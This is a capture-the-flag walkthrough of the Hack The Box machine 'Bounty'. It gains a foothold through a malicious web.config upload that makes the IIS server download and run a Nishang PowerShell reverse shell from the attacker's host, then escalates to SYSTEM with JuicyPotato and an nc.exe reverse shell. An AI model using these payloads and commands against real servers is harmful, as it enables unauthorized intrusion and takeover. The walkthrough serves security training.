## Intro

![](MediaFiles/Pasted%20image%2020260228220053.png)
Tags: #windows #Impersonation #OSCPpath #FileUpload #easy 

---------
# Reconnaissance

## Port scan

### Identify open TCP ports fast

```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv bounty.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 19:05 UTC
Initiating SYN Stealth Scan at 19:05
Scanning bounty.htb (10.129.12.35) [65535 ports]
Discovered open port 80/tcp on 10.129.12.35
adjust_timeouts2: packet supposedly had rtt of -4091793 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -4091793 microseconds.  Ignoring time.
Completed SYN Stealth Scan at 19:06, 26.42s elapsed (65535 total ports)
Nmap scan report for bounty.htb (10.129.12.35)
Host is up, received user-set (0.061s latency).
Scanned at 2026-02-28 19:05:57 UTC for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 17 (748B)
```

### Scan only the open TCP ports

```shell
sudo nmap -p135,8500,49154 -A bounty.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 19:07 UTC
Nmap scan report for bounty.htb (10.129.12.35)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.99 ms 10.10.14.1
2   47.31 ms bounty.htb (10.129.12.35)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

## WebApp enumeration

### Page source

nothing interesting

### Directories

since we know its an IIS server, i also enumerated files with .aspx extension
```shell
gobuster dir -u http://bounty.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .aspx,.asp,.html
```
found those:
```shell
...[snip]...
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedFiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedFiles/]
...[snip]...
```

-------
# Foothold

## File upload

then going on `/transfer.aspx` i see that its a file upload page
`http://bounty.htb/transfer.aspx`
![](MediaFiles/Pasted%20image%2020260228212235.png)
since its an IIS server, some executable file extensions to try are:
- .asp
- .aspx
- .config
- .php

### File Extension validity

tried this `.asp` first
https://gist.githubusercontent.com/magnologan/a805bfd00c4dd7ab40395dc2c8aaa53a/raw/5097c05d761e8d1db755c23252188b286def8e45/webshell.asp
But got `Invalid File. Please try again`
![](MediaFiles/Pasted%20image%2020260228213028.png)
So now i am thinking of trying the other possible extensions, .aspx also failed, and php too. When trying the `.config` extension tho, it succeeded
![](MediaFiles/Pasted%20image%2020260228213126.png)

Now create this `.config` file, that will transfer Nishang's `Invoke-PowerShellTcp.ps1`
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
for the reverse shell:
`web.config`
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<configuration>  
<system.webServer>  
<handlers accessPolicy="Read, Script, Write">  
<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />  
</handlers>  
<security>  
<requestFiltering>  
<fileExtensions>  
<remove fileExtension=".config" />  
</fileExtensions>  
<hiddenSegments>  
<remove segment="web.config" />  
</hiddenSegments>  
</requestFiltering>  
</security>  
</system.webServer>  
<appSettings>  
</appSettings>  
</configuration>  
<%  
Set obj = CreateObject("WScript.Shell")  
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.106:8001/Invoke-PowerShellTcp.ps1')")  
%>
```
also on Nishang's `Invoke-PowerShellTcp.ps1` append this at the end of it
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.106 -Port 4444
```
then upload it, and then access it via `/uploadedfiles/` here
```powershell
http://bounty.htb/uploadedfiles/web.config
```
now got connection on my python server
```powershell
└─$ python3 -m http.server 8001                                                                                           
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.12.35 - - [28/Feb/2026 19:40:47] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

## Shell as user (merlin)
and got shell, grabbed user flag
```powershell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.12.35] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
whoami
bounty\merlin
PS C:\windows\system32\inetsrv> type C:\Users\merlin\Desktop\user.txt
2089d3a2e0051ce6761cffa20aa1d1db
```

------
# Privesc


### System Information ❌

```powershell
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          2/28/2026, 9:02:02 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,315 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,320 MB
Virtual Memory: In Use:    775 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.12.35
                                 [02]: fe80::28f6:636e:659e:7aab
                                 [03]: dead:beef::28f6:636e:659e:7aab

```
nothing interesting
### Privileges ✅

```powershell
whoami /priv
```

```powershell
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
#### SeImpersonatePrivilege 
here `SeImpersonatePrivilege` stands out

now transfer to machine
```powershell
python3 -m http.server 8001
```
`Juicypotato`: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
```powershell
certutil.exe -urlcache -f http://10.10.14.106:8001/JuicyPotato.exe C:\Windows\Temp\JuicyPotato.exe
```
and also `netcat exe`
```powershell
certutil.exe -urlcache -f http://10.10.14.106:8001/nc.exe C:\Windows\Temp\nc.exe
```

### Impersonation

now lets try escalating privs by using juicypotato
```powershell
nc -lvnp 3333
```

```powershell
./JuicyPotato.exe -l 3333 -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.106 3333" -t *
```

```powershell
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 3333
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

## Shell as administrator

and got shell back! grabbed root flag
```powershell
└─$ nc -lvnp 3333                                                                                                                
listening on [any] 3333 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.12.35] 49175
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
User: BOUNTY$ 
Hostname: BOUNTY 
Whoami: 
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : bounty
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-94-F7-EE
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::28f6:636e:659e:7aab(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::28f6:636e:659e:7aab%17(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.12.35(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, February 28, 2026 9:02:33 PM
   Lease Expires . . . . . . . . . . : Saturday, February 28, 2026 10:32:33 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%17
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
Root.txt Content: 
8bc38c9853598478fba3ffcafa5b8922
```

i also found this as usefull to just printout all the info alltogether at the end of each machine to save time
```powershell
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
```
or in powershell
```powershell
echo "User: $env:USERNAME"; echo "Hostname: $env:COMPUTERNAME"; whoami; ipconfig /all; type "C:\Users\Administrator\Desktop\root.txt"
```
## Bonus: juicypotato alternative

An alternative is this one
https://github.com/itm4n/PrintSpoofer
which seems to perform it locally without the need for rev shell and netcat, it has option for cmd on same shell

----
# Summary




-------
# Sidenotes

A good windows machine that deservers a place in my notes for the impersonation part via `SeImpersonatePrivilege` and exploited with juicypotato 

https://labs.hackthebox.com/achievement/machine/284567/142
![](MediaFiles/Pasted%20image%2020260228220108.png)